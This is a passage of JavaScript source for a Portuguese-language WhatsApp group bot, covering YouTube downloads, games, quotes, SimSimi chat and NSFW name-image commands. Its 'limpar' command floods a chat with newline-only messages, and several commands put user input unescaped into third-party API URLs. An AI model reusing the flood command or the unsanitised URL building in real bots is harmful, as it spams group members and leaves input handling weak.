{buttonId: `${prefix}ytvideo ${res.all[0].url}`, buttonText: {displayText: `🎦 Download [ Video ]`}, type: 1}, {buttonId: `${prefix}playvid ${res.all[0].url}`, buttonText: {displayText: `☔ Playlist [ YouTube ]`}, type: 1}], dnselo)
break

case 'playvid4': 
// @VitinhoGostoso
reply('<❗> Aguarde um pouco...')
playvid = args.join(' ')
anu = await fetchJson(`https://nezsab-apis.xyz/api/youtube/playmp4-2?q=${q}&apikey=${keyapi}`)
pla = `---「 𝐘𝐎𝐔𝐓𝐔𝐁𝐄-𝐏𝐋𝐀𝐘 𝐕𝐈𝐃𝐄𝐎 」---\n`
pla += `๖ۣ• ▢️️ *Título:* ${anu.resultado.título}\n`
pla += `๖ۣ• ▢️ *Visualizações:* ${anu.resultado.visualizações}\n`
pla += `๖ۣ• ▢️ *Canal:* ${anu.resultado.canal}\n`
img = await getBuffer(anu.resultado.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { video: { url: anu.resultado.url }, mimetype: 'video/mp4', fileName: `${anu.resultado.título}.mp4` }, { quoted: dnselo })
break        

case 'playvid3': 
// @Vitinho
reply(enviar.espere)
playvid = args.join(' ')
anu = await fetchJson(`https://p7api.xyz/api/ytplaymp4?nome=${playvid}&apikey=${keydop7}`)
pla = `---「 𝐘𝐎𝐔𝐓𝐔𝐁𝐄-𝐏𝐋𝐀𝐘 𝐕𝐈𝐃𝐄𝐎 」---\n`
pla += `➡️ *Título:* ${anu.resultado.título}\n`
pla += `📊️ *Visualizações:* ${anu.resultado.visualizações}\n`
pla += `💈️️ *Canal:* ${anu.resultado.canal}\n`
pla += `🚨 *_Aguarde, estou enviando o vídeo!_*`
img = await getBuffer(anu.resultado.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { video: { url: anu.resultado.url }, mimetype: 'video/mp4', fileName: `${anu.resultado.título}.mp4` }, { quoted: dnselo })
break            

case 'playvid':
reply(`*Olá ${pushname}*, já estou enviando os resultados da pesquisa!`)
if(!q.length > 2) return reply("Cade o título da música que deseja pesquisar?")
var Lrows = []
data = await yts(q) 
for(let a of data.all) {
Lrows.push({title: a.title, description: `Canal: ${a.author.name}\nDuração: ${a.timestamp}`, rowId: `${prefix}ytmp4 ${a.url}`})
}

listMessagze = {
text: "[📋]️ 𝐘𝐓-𝐏𝐋𝐀𝐘𝐋𝐈𝐒𝐓 𝐕𝐈𝐃𝐄𝐎 [🎞️]️",
footer: "© _Copyright by Lorde Bot MD_",
title: ``,
buttonText: "🔍𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🔥",
sections: [{
title: "", 
rows: Lrows
}
]

}
nezuko.sendMessage(from, listMessagze)
break

case 'playaud':
reply(`*Olá ${pushname}*, já estou enviando os resultados da pesquisa!`)
if(!q.length > 2) return reply("Cade o título da música que deseja pesquisar?")
var Lrows = []
data = await yts(q) 
for(let a of data.all) {
Lrows.push({title: a.title, description: `Canal: ${a.author.name}\nDuração: ${a.timestamp}`, rowId: `${prefix}ytaudio2 ${a.url}`})
}

listMessagze = {
text: "[📋]️ 𝐘𝐓-𝐏𝐋𝐀𝐘𝐋𝐈𝐒𝐓 𝐀𝐔𝐃𝐈𝐎 [🎶]️",
footer: "© _Copyright by Lorde Bot MD_",
title: ``,
buttonText: "🔍𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🔥",
sections: [{
title: "", 
rows: Lrows
}
]

}
nezuko.sendMessage(from, listMessagze)
break

 case 'info':
 try {
ppimg = await nezuko.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
me = nezuko.user
uptime = process.uptime()
teks = `
╭━─━───[🦅]────━─━╮
ᴜsᴜᴀ́ʀɪᴏ : ${pushname}
ɴᴏᴍᴇ ᴅᴏ ʙᴏᴛ : ${NomeDoBot}
ɴᴜ́ᴍᴇʀᴏ ᴅᴏ ʙᴏᴛ : wa.me/${me.id.split('@')[0]}
ᴘʀᴇғɪxᴏ : 『 ${prefix} 』
ᴏ ʙᴏᴛ ᴇsᴛᴀ́ ᴀᴛɪᴠᴏ ᴅᴇsᴅᴇ  : ${runtime(uptime)}
╰━─━───[🦅]────━─━╯`
daftarimgg = await getBuffer(ppimg)
nezuko.sendMessage(from, {image: daftarimgg, caption: teks, mentions: [nezuko.user.id]})
break

            case 'tempban': {
                    if (!isGroup) return reply(mess.only.group)
                    if (!isBotAdmins) return reply(mess.only.botadm)
                    if (!isGroupAdmins) return reply(enviar.msg.adm)
                    let users4 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                await nezuko.groupParticipantsUpdate(m.chat, [users4], 'remove').then((res) => console.log(jsonformat(res))).catch((err) => console.log(jsonformat(err)))
           reply(`Pronto.`)
                await sleep(300000)
           await nezuko.groupParticipantsUpdate(m.chat, [users4], 'add').then((res) => console.log(jsonformat(res))).catch((err) => console.log(jsonformat(err)))
            }
            break

case 'del': case 'delete': case 'd': {
if (!isPremium && !isGroupAdmins && !SoDono) return reply(enviar.msg.premium)
if (!quoted) return
let { chat, fromMe, id } = quoted
nezuko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'apagar':
nezuko.sendMessage(from, { delete: {remoteJid:m.chat,id: m.quoted.id, participant:m.quoted.sender }})
break

case 'destrava': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonsee = [
                    {buttonId: `/destrava2`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonsee,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava2': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseee = [
                    {buttonId: `/destrava3`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava2}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseee,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava3': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeee = [
                    {buttonId: `/destrava4`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava3}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseeee,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava4': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)  
                let buttonseeeee = [
                    {buttonId: `/destrava5`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava2}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseeeee,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava5': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttondes = [
                    {buttonId: `/destrava6`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava5}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttondes,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava6': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttondess = [
                    {buttonId: `/destrava7`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava6}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttondess,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava7': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebute = [
                    {buttonId: `/destrava8`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava7}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseebute,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava8': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebuute = [
                    {buttonId: `/destrava9`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava8}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseebuute,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava9': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebutte = [
                    {buttonId: `/destrava10`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava9}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseebutte,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava10': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebutee = [
                    {buttonId: `/destrava11`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava10}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseebutee,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava11': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeebute = [
                    {buttonId: `/destrava12`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava11}`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonseeebute,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava12': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buuttonseeebute = [
                    {buttonId: `/destrava13`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava12}`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: buuttonseeebute,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'destrava13': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeebuttte = [
                    {buttonId: `/limpar`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava13}`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: buttonseeebuttte,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'subir': case 'limpar':
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
nezuko.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: dnselo})
break

//========FINAL DOS MENU=============

//=======MÚSICAS=============

case 'frase2':
try {
ppimg = await nezuko.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

hehe = await fetchJson(`https://www.luc4rio-rest-api.tk/api/aleatorios/frases`)
if (hehe.error) return reply(hehe.error)
ccg =
`
  ‣ Author: ${hehe.Author}
 
  ‣ Criador: ${hehe.Criador}
 
  ‣ Frase: 
 
  ${hehe.Frase}\n`
daftarimg = await getBuffer(ppimg)
await nezuko.sendMessage(from, {image: daftarimg, caption: ccg}, {quoted: dnselo})
break

case 'frase'://by Daniel>\<
                    rate = body.slice(6)
					var foda =['amor imaturo diz: Eu te amo porque preciso de você','A vida começa a cada cinco minutos','Onde as palavras falham, a música fala','Um bom viajante não tem planos','Uma vez que aceitamos nossos limites, vamos além deles','O que não nos mata nos fortalece','Se você caminha sozinho, você vai mais rápido Se vocês caminharem juntos, vocês irão mais longe','Uma vida cheia de erros não é apenas mais honrosa, mas é mais sábia do que uma vida gasta sem fazer nada','Nunca perca o senso de humor e aprenda a rir de suas próprias falhas','A preocupação é como uma cadeira de balanço, ela mantém você ocupado, mas não leva a lugar nenhum','O homem que viveu mais tempo não é aquele que completou mais anos, mas aquele que mais experimentou a vida','Se você pode sonhar, você pode fazer','O impossível é o fantasma dos tímidos e o refúgio dos covardes','O caminho que temos que percorrer 998 é cheio de surpresas. Você nunca estará preparado para aqueles que o tocam, sejam eles felizes ou sombrios, porque isso faz parte de ganhar experiência. E descobrir quão agradáveis ​​ou infelizes são aqueles que esperam por você, é algo que você nunca poderá evitar','A felicidade não é algo que você adia para o futuro, é algo que você projeta para o presente','Os amigos devem ser como dinheiro, que antes de precisar, você sabe o seu valor','O homem que viveu mais tempo não é aquele que completou mais anos, mas aquele que mais experimentou a vida']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					reply(` ${zaltin} `)
					break

case 'frase3':

var frase = JSON.parse(fs.readFileSync("./funções de cmd/grupos/frases.json"));
var randomfrases = frase[Math.floor(Math.random() * frase.length)]
buttons2 = [
{ buttonId: `${prefix}frase3`, buttonText: { displayText: 'PRÓXIMA FRASE'}, type: 1 }]

buttonMessage2 = {
text: `${randomfrases}`,
footer: `by ${NomeDoBot}`,
buttons: buttons2,
headerType: 1
}
nezuko.sendMessage(from, buttonMessage2, { quoted: info })
break

case 'enquete':
if(!q) return reply(`cade o nome?`)
nezuko.relayMessage(from, 
{
  pollCreationMessage: {
    name: budy.slice(8).trim(),
    options: [
      { optionName: "Sim" },
      { optionName: "Talvez" },
      { optionName: "Não" }
      ],
    selectableOptionsCount: 1
  }
}, {})
break

case 'eununca': {

	const perg = (eununca[Math.floor(Math.random() * eununca.length)])
let buttonss = [

                    {buttonId: `${prefix}ja`, buttonText: {displayText: 'Eu já'}, type: 1},
                    {buttonId: `${prefix}nunca`, buttonText: {displayText: 'Eu nunca'}, type: 1}]
                let bb = {
                    text: `${perg}`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: buttonss,
                    headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

case 'ja': {
let aa = [
                    {buttonId: `${prefix}eununca`, buttonText: {displayText: 'Próxima pergunta!'}, type: 1}]
                let bb = {
                    text: `Rapaz nem vou comentar nada pq se eu falar tô errado.`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: aa,
                    headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

case 'nunca': {
let aa = [
                    {buttonId: `${prefix}eununca`, buttonText: {displayText: 'Próxima pergunta!'}, type: 1}]
                let bb = {
                    text: `Finalmente um santinho por aqui ou está fingindo hein? 😳`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: aa,
                    headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

case 'pgt_desafio':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
sunsen = `🌹 *Pergunta / Desafio* 🌹

Escolha uma opção abaixo entre pergunta e desafio, responda ou complete oque você escolheu, ou se preferir, pule.

As perguntas e desafios são a meu critério, e ai, vamos jogar?`
sendBtext(from,sunsen, `${NomeDoBot}`, [{buttonId: `${prefix}pergunta`, buttonText: {displayText: `🌹 PERGUNTA 🌹`}, type: 1}, {buttonId: `${prefix}desafio`, buttonText: {displayText: `🌹 DESAFIO 🌹`}, type: 1}], dnselo)
break

case 'pergunta':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await nezuko.sendMessage(from, {react: { text: "😇", key: info.key }})
sunsen = JSON.parse(fs.readFileSync("./lib/pgt.json"))
moon = sunsen[Math.floor(Math.random() * sunsen.length)]
sendBtext(from,moon, `${NomeDoBot}`, [{buttonId: `${prefix}pergunta`, buttonText: {displayText: `🌹 PRÓXIMA PERGUNTA 🌹`}, type: 1}, {buttonId: `${prefix}desistir`, buttonText: {displayText: `🌹 DESISTIR 🌹`}, type: 1}], dnselo) 
break

case 'desafio':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await nezuko.sendMessage(from, {react: { text: "😈", key: info.key }})
sunsen = JSON.parse(fs.readFileSync("./lib/desafio.json"))
moon = sunsen[Math.floor(Math.random() * sunsen.length)]
sendBtext(from,moon, `${NomeDoBot}`, [{buttonId: `${prefix}desafio`, buttonText: {displayText: `🌹 PRÓXIMO DESAFIO 🌹`}, type: 1}, {buttonId: `${prefix}desistir`, buttonText: {displayText: `🌹 DESISTIR 🌹`}, type: 1}], dnselo) 
break

case 'desistir':
if(!isGroup) return reply(mess.only.group)
if(!isGame) return reply(mensagem[0].game);
await nezuko.sendMessage(from, {react: { text: "🙄", key: info.key }})
reply (`${pushname} que triste, não aguentou a jogar e pediu desistência, que triste mas fazer oque né...`)
break

case 'ytvideo':
let { ytv } = require('./funções/y2mate')
if (!q) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
let quality = args[1] ? args[1] : '360p'
media = await ytv(`${q.replace("/shorts/", "/watch?v=").split('?feature')[0]}`, quality)
if (media.filesizeF.split('MB')[0] >= 250) return reply(`Video muito pesado`)
nezuko.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4'}, {quoted: dnselo})
break
//========FINAL DAS MÚSICAS=============

//=(CASE-SIMIH-INTELIGÊNCIA-ARTIFICIAL)=\\

case 'simi':
if(isSimi) return reply('Desativado')
sduy = args.join(" ")
data = await fetchJson(`https://api.simsimi.net/v2/?text=${sduy}&lc=pt`, {method: 'get'})
simi = `${data.success}`  
reply(simi)
break

case 'simih':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return reply('O modo Simi está ativo')
samih.push(from)
fs.writeFileSync('./funções de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Ativado com sucesso o modo simi neste grupo 😗')
} else if (Number(args[0]) === 0) {
if(!isSimi) return reply('Já está Desativado.')
samih.splice(from, 1)
fs.writeFileSync('./funções de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

case 'simih2':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi2) return reply('O modo Simi está ativo')
samih2.push(from)
fs.writeFileSync('./funções de cmd/funções/simi.json', JSON.stringify(samih2))
reply('Ativado com sucesso o modo simi neste grupo 😗, Este simih2 ele aprende as respostas e perguntas das pessoas, conforme vai falando, por isso, só recomendo utilizar ele no termux, pois no site ou lugar diferente do termux que você utilizar, ele não vai armazenar os dados nescessarios')
} else if (Number(args[0]) === 0) {
if(!isSimi2) return reply('Já está Desativado.')
samih2.splice(from, 1)
fs.writeFileSync('./funções de cmd/funções/simi.json', JSON.stringify(samih2))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

//========================================\\


//==========(PLAQUINHAS-LOGOS)===========\\
case 'plaquinha': case 'plaquinhas': {
sections = [
{title: "",
rows: [
{title: `[🔞] Plaquinha 01 com o nome ${q}`, rowId: `${prefix}plaq ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 02 com o nome ${q}`, rowId: `${prefix}plaq2 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 03 com o nome ${q}`, rowId: `${prefix}plaq3 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 04 com o nome ${q}`, rowId: `${prefix}plaq4 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 05 com o nome ${q}`, rowId: `${prefix}plaq5 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 06 com o nome ${q}`, rowId: `${prefix}plaq6 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 07 com o nome ${q}`, rowId: `${prefix}plaq7 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 08 com o nome ${q}`, rowId: `${prefix}plaq8 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 09 com o nome ${q}`, rowId: `${prefix}plaq9 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 10 com o nome ${q}`, rowId: `${prefix}plaq10 ${q}`, description: `${NomeDoBot}`},
{title: `[🔞] Plaquinha 11 com o nome ${q}`, rowId: `${prefix}plaq11 ${q}`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Selecione a plaquinha desejada!`,
  footer: `© _Copyright by Lorde-Bot MD_`,
  title: `[🔞] 𝐏𝐋𝐀𝐐𝐔𝐈𝐍𝐇𝐀𝐒-𝐍𝐒𝐅𝐖 [🔞]️`,
  buttonText: "🔍 𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑: 🔍",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'plaq': //by Nezuko-MD
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq e digite o seu nome`)
teks = body.slice(6)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21`)
nezuko.sendMessage(sender, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

case 'plaq2': //by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq2 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=${teks}`)
nezuko.sendMessage(sender, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

case 'plaq3': //by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq3 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=${teks}&text.0.outline.blur=63`)
nezuko.sendMessage(sender, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

case 'plaq4'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
